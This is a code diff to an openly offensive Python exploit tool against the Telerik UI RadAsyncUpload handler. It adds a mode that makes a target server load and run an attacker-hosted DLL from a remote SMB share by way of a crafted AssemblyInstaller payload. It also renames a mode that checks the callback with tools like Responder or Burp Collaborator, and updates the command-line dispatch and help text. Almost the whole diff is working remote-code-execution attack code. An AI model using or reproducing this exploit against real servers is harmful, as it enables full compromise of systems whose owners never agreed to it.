@@ -354,7 +354,7 @@ def mode_send_custom_Payload(proxy = False):
 def mode_send_custom_Payload_proxy(): 
     mode_send_custom_Payload(sys.argv[5])
 
-def mode_send_remote_Payload(proxy = False):
+def mode_test_remote_Payload(proxy = False):
 	print(upload(
 		custom_payload(  # filename is randomised to workaround the caching of failure to load assembly - ensures the target will re-attempt each time
 			'{"Path":"file:////' + sys.argv[2] + '/share/mixed_mode_assembly_' + str(uuid.uuid1()) + '.dll"}', 
@@ -362,8 +362,19 @@ def mode_send_remote_Payload(proxy = False):
 		), sys.argv[3], proxy)
 	)
 
-def mode_send_remote_Payload_proxy():
-	mode_send_remote_Payload(sys.argv[4])
+def mode_test_remote_Payload_proxy():
+	mode_test_remote_Payload(sys.argv[4])
+
+def mode_load_remote_Payload(proxy = False):
+    print(upload(
+        custom_payload(
+            '{"Path":"file:////' + sys.argv[2] + '"}', 
+            'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
+        ), sys.argv[3], proxy)
+    )
+
+def mode_load_remote_Payload_proxy():
+    mode_load_remote_Payload(sys.argv[4])
 
 def mode_payload():
     # generate a payload based on TempTargetFolder, Version and payload file
@@ -404,8 +415,10 @@ def mode_help():
         "Generate custom payload POST data : -c partA partB\n" +
         "Send custom payload:                -C partA partB url [proxy]\n\n" +
 
-        "Test Responder/Burp Collaborator    -R lhost url [proxy]\n\n" + 
-        #    ;)
+        "Check remote SMB payload capability -r lhost url [proxy]\n\n" +
+        #    E.g. Responder/Collaborator
+
+#        "Load remote payload                 -R lhost/share/mixed_mode_assembly.dll url [proxy]\n\n" +
 
         "Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau\n" +
         "Example Version:           2016.2.504\n" +
@@ -438,10 +451,14 @@ if __name__ == "__main__":
         mode_send_custom_Payload()
     elif sys.argv[1] == "-C" and len(sys.argv) == 6:
         mode_send_custom_Payload_proxy()
+    elif sys.argv[1] == "-r" and len(sys.argv) == 4:
+        mode_test_remote_Payload()
+    elif sys.argv[1] == "-r" and len(sys.argv) == 5:
+        mode_test_remote_Payload_proxy()        
     elif sys.argv[1] == "-R" and len(sys.argv) == 4:
-        mode_send_remote_Payload()
+        mode_load_remote_Payload()
     elif sys.argv[1] == "-R" and len(sys.argv) == 5:
-        mode_send_remote_Payload_proxy()        
+        mode_load_remote_Payload_proxy()              
     elif sys.argv[1] == "-p" and len(sys.argv) == 5:
         mode_payload()
     elif sys.argv[1] == "-P" and len(sys.argv) == 6:
